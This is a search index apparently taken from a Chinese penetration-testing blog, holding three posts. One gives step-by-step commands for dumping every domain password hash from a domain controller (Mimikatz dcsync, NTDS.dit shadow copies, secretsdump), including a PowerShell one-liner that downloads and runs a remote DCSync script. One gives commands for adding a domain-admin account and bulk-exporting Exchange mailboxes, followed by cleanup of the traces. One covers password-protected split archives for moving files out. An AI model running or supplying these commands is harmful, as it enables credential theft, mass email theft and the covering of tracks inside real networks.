<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[[域渗透]导出域用户Hash方法总结]]></title>
    <url>%2F2019%2F09%2F03%2F%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%AF%BC%E5%87%BA%E5%9F%9F%E7%94%A8%E6%88%B7Hash%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[在拥有域管权限时，可以提取所有域用户的密码Hash，为下一步渗透做准备。 一、如何 Dump HashHash 值存储在域控制器中（C:\Windows\NTDS\NTDS.DIT）NTDS.DIT 文件经常被操作系统使用，无法直接复制到其它位置。可尝试以下方法 Dump Hash。 1. MimikatzMimikatz有一个功能（dcsync），它利用目录复制服务（DRS）从 NTDS.DIT 文件中检索密码 Hash 值。 需要权限：域管权限Mimikatz 需免杀 1Mimikatz &quot;lsadump::dcsync /domain:test.com /all /csv&quot; exit &gt; hash.txt 2. NtdsutilNtdsutil 域控制器默认安装，使管理员能访问和管理 Windows Active Directory 数据库。渗透测试中可以用它来拍摄 ntds.dit 文件的快照 需要权限：域管权限 123456789101112131415# 创建快照ntdsutil snapshot &quot;activate instance ntds&quot; create quit quitGUID 为 &#123;aa488f5b-40c7-4044-b24f-16fd041a6de2&#125;# 挂载快照ntdsutil snapshot &quot;mount GUID&quot; quit quit# 复制 ntds.ditcopy C:\$SNAP_201908200435_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit# 卸载快照ntdsutil snapshot &quot;unmount GUID&quot; quit quit# 删除快照ntdsutil snapshot &quot;delete GUID&quot; quit quit# 查询快照ntdsutil snapshot &quot;List All&quot; quit quitntdsutil snapshot &quot;List Mounted&quot; quit quit 3. Vssadmin域控制器默认安装 需要权限：域管权限 12345678910# 查询当前系统的快照vssadmin list shadows# 创建快照vssadmin create shadow /for=c: /autoretry=10&quot;Shadow Copy Volume Name&quot; 为 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1&quot;Shadow Copy ID&quot; 为 &#123;aa488f5b-40c7-4044-b24f-16fd041a6de2&#125;# 复制 ntds.ditcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit# 删除快照vssadmin delete shadows /for=c: /quiet 4. DiskshadowDiskShadow 是由微软官方签名的，Windows Server 2008、2012、2016 都包含了 DiskShadow，所在目录C:\windows\system32\diskshadow.exe。包含交互式命令和脚本模式。使用时，必须在 C:\windows\system32\ 启动，其它目录调用会出错，如： 12# 错误示范C:\Users\Administrator\Desktop&gt;C:\windows\system32\diskshadow.exe 下面利用脚本模式提取AD数据库12345# 查看存放 `ntds.dit` 的逻辑驱动器（一般为 C 盘）# 找出系统没有使用的逻辑驱动器号wmic logicaldisk# 调用脚本C:\windows\system32\diskshadow.exe /s C:\shadow.txt shadow.txt 内容1234567set context persistent nowritersadd volume c: alias someAliascreateexpose %someAlias% z:exec &quot;cmd.exe&quot; /c copy z:\windows\ntds\ntds.dit c:\ntds.ditdelete shadows volume %someAlias%reset 5. Powershell项目地址：https://github.com/EmpireProject/Empire12# 远程加载 Invoke-DCSync.ps1powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-DCSync.ps1')";Invoke-DCSync -PWDumpFormat &gt; hash.txt 二、如何从 ntds.dit 提取 Hash1. NTDSDumpEx12345678910usage: ntdsdumpex.exe &lt;-d ntds.dit&gt; &lt;-k HEX-SYS-KEY | -s system.hiv |-r&gt; [-o out.txt] [-h] [-m] [-p] [-u]-d path of ntds.dit database-k use specified SYSKEY-s parse SYSKEY from specified system.hiv-r read SYSKEY from registry-o write output into-h dump hash histories(if available)-p dump description and path of home directory-m dump machine accounts-u USE UPPER-CASE-HEX 123# 离线模式：先导出注册表reg save hklm\system system.hivNTDSDumpEx.exe -d ntds.dit -s system.hiv -o hash.txt 12# 在线模式：无需导出注册表NTDSDumpEx.exe -d ntds.dit -r -o hash.txt 2. Impacket项目地址：https://github.com/SecureAuthCorp/impacket 因为 Kali 的 python 环境安装得比较全，所以使用 Kali 来解 Hash1git clone https://github.com/SecureAuthCorp/impacket 123# 安装所需库 pip install .python setup.py 12# 使用 secretsdump.py 解 Hash/impacket/examples# python secretsdump.py -ntds /home/workspace/hash/ntds.dit -system /home/workspace/hash/sys.hiv LOCAL &gt; /home/workspace/hash/hash.txt 三、总结 Mimikatz 在域用户机器执行需要域管权限时，可使用 psexec、计划任务等远程执行 使用 Ntdsutil、Vssadmin 等卷影拷贝工具时，需要先开启 Volume Shadow Copy Service 服务 有时遇到 NTDSDumpEx 提取出错，可以尝试修复 ntds.dit，修复后还无法提取，则使用 secretsdump.py。缺点：比较耗时 四、参考文章Dump域内用户Hash姿势集合域渗透——获得域控服务器的NTDS.dit文件NTDS.dit密码快速提取工具]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>系统工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[域渗透]Exchange邮件导出]]></title>
    <url>%2F2019%2F08%2F13%2F%E5%9F%9F%E6%B8%97%E9%80%8F-Exchange%E9%82%AE%E4%BB%B6%E5%AF%BC%E5%87%BA%2F</url>
    <content type="text"><![CDATA[使用 Exchange Management Shell (EMS) 导出邮件 一、测试环境机器名IP备注AD01192.168.20.10win server 2008 r2，域控Exchange01192.168.20.11win server 2008 r2，Exchange 2010，安装所有角色john-pc192.168.20.12window 7，域内个人机打开 PST 邮件，使用 free kernel pst viewer 二、基于 EMS 操作步骤 需要在 Exchange01 服务器 UI 界面操作 and 打开 AD01 域控服务器 在邮件服务器上打开 Exchange Management Shell 打开 EMS 所需权限：Organization Management 组成员1234# 提升 &apos;scarlet&apos; 用户为域管权限 and 加入 Organization Management 组net user scarlet 123456 /addnet group &quot;domain admins&quot; scarlet /addnet group &quot;Organization Management&quot; scarlet /add 新建一个 Exchange 角色组并将其添加到 Mailbox Import Export 管理角色中 123# 创建一个角色组名称为 "Enterprise Mail Support"，并将其赋予 "Mailbox Import Export" 角色权限，将 'scarlet' 用户加入到组成员# 创建完成需要重启 EMSNew-RoleGroup -Name "Enterprise Mail Support" -Roles "Mailbox Import Export" -Members scarlet -Description "Import Export_Enterprise Support" 创建共享文件夹 1net share test$=c:\temp\PST /GRANT:Everyone,FULL 获取所有用户邮件地址 12# 导出到 csvGet-Mailbox -ResultSize Unlimited |select displayname,PrimarySmtpAddress |Export-Csv -Encoding utf8 all-email.csv -NoTypeInformation 导出指定用户邮件 1234# 导出邮件需要凭证为 "Mailbox Import Export" 角色组成员# hostname 如果是本机，需要填本机计算机名，如 exchange01，不能 127.0.0.1# 也可以导出到其它机器的共享文件夹，注意文件夹权限，否则导出失败New-MailboxExportRequest -Mailbox scarlet -FilePath "\\hostname\test$\scarlet.pst" 使用 CSV 文件导出所有用户邮件 123456# 把需要导出的用户名写到 all-email.csv$mail = import-csv -path "C:\temp\all-email.csv"foreach ($user in $mail)&#123; $Alias = $user.displaynameNew-MailboxExportRequest -Mailbox $Alias -FilePath "\\exchange01\test$\$Alias.pst"&#125; 清理痕迹 12345678# 删除角色Remove-RoleGroup -Identity "Enterprise Mail Support"# 删除已完成请求Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest# 从组中删除用户 net group "Organization Management" scarlet /delete# 删除用户（可跳过这步保留用户）net user scarlet /delete 三、基于远程 PowerShell 操作步骤 需要在 john-pc 个人机的 PowerShell 操作 and 打开 AD01 域控服务器需要管理员权限开启 PowerShell (1) 有 UI 界面 设置 powershell 执行权限 1Set-ExecutionPolicy RemoteSigned 设置密码 1$pass = ConvertTo-SecureString "!QAZ2wsx" -AsPlainText -Force 设置凭证 1$Credential = New-Object System.Management.Automation.PSCredential ("scarlet@test.com", $pass) 设置会话 12# 注意：-ConnectionUri 的值是 http、不是 https$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://exchange01.test.com/PowerShell/ -Authentication Kerberos -Credential $Credential 导入会话 1Import-PSSession $Session -DisableNameChecking 遍历用户邮箱 1Get-Mailbox -ResultSize Unlimited |select displayname,PrimarySmtpAddress 创建导入导出角色 1New-RoleGroup –Name "Enterprise Mail Support" -Roles "Mailbox Import Export" -Members scarlet -Description "Import Export_Enterprise Support" 导出邮件 12# 导出邮件需要凭证为 "Mailbox Import Export" 角色组成员New-MailboxExportRequest -Mailbox john -FilePath "\\exchange01\test$\john.pst" 清理痕迹 1234# 删除角色Remove-RoleGroup -Identity "Enterprise Mail Support"# 删除已完成请求Get-MailboxExportRequest –Status Completed | Remove-MailboxExportRequest 移除会话 1Remove-PSSession $Session (2) 纯命令行操作 12# 绕过 Powershell 执行权限，执行 abc.ps1PowerShell -exec bypass -command ". 'C:\programdata\abc.ps1'" &gt; log.txt abc.ps1 内容如下，注释部分按需解除 12345678910111213141516171819202122232425262728$pass = ConvertTo-SecureString "!QAZ2wsx" -AsPlainText -Force # 用户名即使没创建邮箱，也应写邮箱地址全称，如：scarlet@test.com$Credential = New-Object System.Management.Automation.PSCredential ("scarlet@test.com", $pass) $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://exchange01.test.com/PowerShell/ -Authentication Kerberos -Credential $Credential Import-PSSession $Session -DisableNameChecking # 获取所有用户邮件地址# Get-Mailbox -ResultSize Unlimited |select displayname,PrimarySmtpAddress # 添加导入导出角色# New-RoleGroup –Name "Enterprise Mail Support" -Roles "Mailbox Import Export" -Members scarlet -Description "Import Export_Enterprise Support" # 按收发时间导出邮件，用户名在 all-email.csv 文件 'displayname' 列&lt;# $mail = import-csv -path "c:\programdata\all-email.csv" foreach ($user in $mail)&#123; $Alias = $user.displayname New-MailboxExportRequest -ContentFilter &#123;((Sent -gt '07/15/2019 0:00:00') -and (Sent -lt '07/31/2019 23:59:59')) -or ((Received -gt '07/15/2019 0:00:00') -and (Received -lt '07/31/2019 23:59:59'))&#125; -Mailbox $Alias -FilePath "\\exchange01\test$\$Alias.pst" &#125;#&gt; # 清除已完成请求# Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequestRemove-PSSession $Session 四、其它常用命令记录 导出用户 Tony 在 2010 年 1 月 1 日之前收到的邮件正文中包含“公司”和“利润”的邮件。有关如何使用 ContentFilter 参数的详细信息。 1New-MailboxExportRequest -Mailbox Tony -ContentFilter &#123;(body -like "*company*") -and (body -like "*profit*") -and (Received -lt "01/01/2010")&#125; -FilePath "\\SERVER01\PSTFileShare\Tony_CompanyProfits.pst" 将 Kweku 的收件箱中的所有邮件导出到 .pst 文件 1New-MailboxExportRequest -Mailbox Kweku -IncludeFolders "#Inbox#" -FilePath \\SERVER01\PSTFileShare\Kweku\LegalHold.pst 五、参考文章使用远程 PowerShell 连接到 Exchange 服务器Exchange 邮件导出方法Exchange 用户归档邮件导入导出 PST 操作实例Exchange 2010 SP1 及以上邮箱的数据导出与导入域渗透之Exchange Server-ContentFilter 参数的可筛选属性)]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>EMS</tag>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[快速打包系统文件]]></title>
    <url>%2F2019%2F05%2F09%2F%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[在传输速度有限制的情况下，快速压缩大文件能大大提升效率，为下一步的分析工作赢得时间 一、Windows1. 7z支持格式：7z，ZIP，XZ，BZIP2，GZIP，TAR 12345 a 文件名-t 压缩类型，如 -tzip，默认 7z-r 递归压缩-p 指定密码，如 -p123456-v 分卷压缩，单位 b|k|m|g 普通压缩1234# 单个文件7z.exe a filename.7z -p123456 filename.txt# 递归压缩文件夹7z.exe a filename.7z -p123456 -r dir_path 分卷压缩17z.exe a filename.7z -p123456 -v100m filename.txt 2. WinRAR提取 winRAR 安装目录中的 rar.exe 即可使用注意： 在 32 位系统运行完毕会报错，不懂为何 12345678 a 文件名 -a 添加要压缩的文件-p 指定压缩密码-r 递归压缩,默认只压根目录,需要先注册下,把rarreg.key丢到安装winrar目录即可-v 分卷压缩，单位 b|k|m|g-m3 标准(默认)-m4 较好(较高的压缩比) -m5 最优(最高压缩比,速度最慢) 123456# 单个文件rar.exe a filename.rar -p123456 -m4 -a filename.txt# 文件夹rar.exe a filename.rar -p123456 -m5 -r -a dir_path# 分卷压缩rar.exe a filename.rar -p123456 -m4 -v100m -a filename.txt]]></content>
      <tags>
        <tag>小工具</tag>
      </tags>
  </entry>
</search>
